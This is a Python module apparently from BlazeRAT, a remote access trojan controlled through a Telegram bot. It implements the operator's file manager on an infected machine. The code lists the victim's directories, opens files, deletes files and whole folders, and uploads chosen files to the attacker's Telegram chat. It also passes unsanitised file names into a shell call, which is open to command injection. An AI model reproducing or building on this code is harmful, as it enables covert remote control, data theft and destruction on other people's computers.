#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from shutil import rmtree
from telebot import types
import core.logger as Logger
import core.messages as Messages
from services.shell import ChangeDir
from services.transfer import UploadFile
from os import path, listdir, getcwd, remove, system

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to work with files.
"""

# Это говно я писал когда бухал.
# Такшо говнокод это норма!

# For messages
FILE_ACTIONS = {
    "FC1": "Open",
    "FC2": "Delete",
    "FC3": "Download",
}

""" Get char by file """
def GetFmt(file: str) -> str:
    if path.isfile(file):
        return "📄 " + file
    else:
        return "📂 " + file

""" Open file or change directory """
def OpenPath(file: str, chatid: int, bot) -> None:
    if path.isfile(file):
        system("xdg-open " + file)
        bot.send_message(chatid, Messages.file.start_file_success % file)
    else:
        response = ChangeDir(file)
        Filemanager(chatid, bot)
        bot.send_message(chatid, response)

""" Remove file or directory """
def DeletePath(file: str, chatid: int, bot) -> None:
    # Delete file
    if path.isfile(file):
        try:
            remove(file)
        except Exception as error:
            bot.send_message(chatid, Messages.file.remove_file_failed % (error.args[-1], file))
        else:
            bot.send_message(chatid, Messages.file.remove_file_success % file)
    # Delete directory
    else:
        try:
            rmtree(file)
        except Exception as error:
            bot.send_message(chatid, Messages.file.remove_directory_failed % (error.args[-1], file))
        else:
            bot.send_message(chatid, Messages.file.remove_directory_success % file)

""" Enumerate files and dirs to telebot markup """
def EnumFiles():
    found = []
    # Get files
    for file in listdir(getcwd()):
        found.append(GetFmt(file))
    # Telegram inline keyboard markup
    markup = types.InlineKeyboardMarkup()
    sortfiles = sorted(found)
    sortfiles.insert(0, "..")
    for file in sortfiles:
        if file == "..":
            markup.add(types.InlineKeyboardButton(text="⬆️ Parent directory", callback_data="FA.."))
        else:
            markup.add(types.InlineKeyboardButton(text=file, callback_data="FA" + file[2:]))
    return markup

""" Open file control menu """
def OpenFileActionsMenu(callback: dict, bot) -> None:
    file = callback.data[2:]
    chatid = callback.from_user.id
    # Chdir to parent directory
    if file == "..":
        return OpenPath("..", chatid, bot)
    # Send actions
    markup = types.InlineKeyboardMarkup()
    for action in FILE_ACTIONS.keys():
        markup.add(types.InlineKeyboardButton(text=FILE_ACTIONS[action], callback_data=action + file))
    bot.send_message(chatid,
        "🗄 Filemanager:\n" + GetFmt(path.abspath(file)),
        reply_markup=markup
    )

""" Make file action """
def MakeFileAction(callback: dict, bot) -> None:
    file = path.abspath(callback.data[3:])
    action = FILE_ACTIONS[callback.data[:3]]
    chatid = callback.from_user.id

    # Log
    Logger.Log(f"Filemanager action '{action}', taget file: '{file}'", chatid)
    # Action
    if action == "Open":
        OpenPath(file, chatid, bot)
    elif action == "Delete":
        DeletePath(file, chatid, bot)
    elif action == "Download":
        UploadFile(file, chatid, bot)


""" Open filemanager interface """
def Filemanager(chatid: int, bot) -> None:
    markup = EnumFiles()
    bot.send_message(chatid, "🗄 Filemanager:\n" + GetFmt(path.abspath(getcwd())), reply_markup=markup)
